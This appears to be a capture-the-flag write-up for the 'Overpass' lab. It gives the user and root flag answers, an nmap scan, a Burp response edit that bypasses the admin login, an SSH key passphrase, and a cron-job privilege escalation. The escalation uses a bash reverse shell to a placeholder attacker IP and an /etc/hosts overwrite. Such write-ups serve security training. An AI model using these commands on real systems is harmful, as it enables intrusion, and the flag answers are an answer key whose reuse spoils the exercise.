# Overpass
##### Question 1: User flag
Answer
```bash
thm{65c1aaf000506e56996822c6281e6bf7}
```

##### Question 2: Root flag
Answer
```bash
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

- - - - - - - - - - - - - - - - -  - - - - - - - - - - - - - -  - - - 

Nmap Scan:
```bash
Nmap scan report for 10.10.29.239
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   41.89 ms  10.6.0.1
2   ... 3
4   109.43 ms 10.10.29.239
```

In Burp Modify Server Response to gain access to /admin
```bash

- - - - - - - - - - -
Original Resoponse

HTTP/1.1 200 OK
Date: Fri, 17 Dec 2021 23:59:15 GMT
Content-Length: 21
Content-Type: text/plain; charset=utf-8
Connection: close

Incorrect Crednetials

- - - - - - - - - - - 
Change To

HTTP/1.1 302 Found
Date: Fri, 17 Dec 2021 23:59:15 GMT
Content-Length: 21
Content-Type: text/plain; charset=utf-8
Connection: close
location: /admin


```

SSH Key Pass
```bash
james13
```

PE Screenshot:
![[Pasted image 20211217183632.png]]

Priv Esc:
```bash
Cron Job running as root

On Attacker Machine:
nc -nvlp 9001
mkdir www/downloads/src/
echo "#!/bin/bash" > buildscript.sh
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1';" >> buildscript.sh
python -m SimpleHTTPServer 80
nc -nvlp 9001

On Victom Machine:
echo "10.6.32.32    overpass.thm" > /etc/hosts

```